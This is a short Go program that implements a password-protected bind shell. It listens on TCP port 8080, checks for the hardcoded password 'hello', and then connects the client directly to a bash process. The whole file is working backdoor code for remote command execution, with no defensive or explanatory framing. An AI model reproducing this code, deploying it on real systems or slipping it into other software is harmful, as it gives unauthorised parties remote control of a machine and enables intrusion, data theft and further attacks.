package main 

import (
	"fmt"
	"net"
	"bufio"
	"os/exec"
)

func main() {
	listener,err:= net.Listen("tcp",":8080");
	
	if err != nil {
		panic(err)
	}
	defer listener.Close();


	for {
		conn, err := listener.Accept()
		if err != nil {
			panic(err)
		}
		defer conn.Close()
		
		fmt.Println("New connection established:", conn.RemoteAddr())
		
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn){
	defer conn.Close();
	message := "Write the password\n"
	conn.Write([]byte(message))
	reader := bufio.NewReader(conn);
	pass, _:= reader.ReadString('\n')
	if pass != "hello\n" {
		fmt.Println("❌ Incorrect password")
		return
	}
	conn.Write([]byte("Welcome! You now have a real shell.\n"))

	cmd := exec.Command("bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err:= cmd.Run()
	if err !=nil {
		fmt.Println("Error starting shell:", err)
	}
	
	fmt.Println("Shell session ended for:", conn.RemoteAddr())
}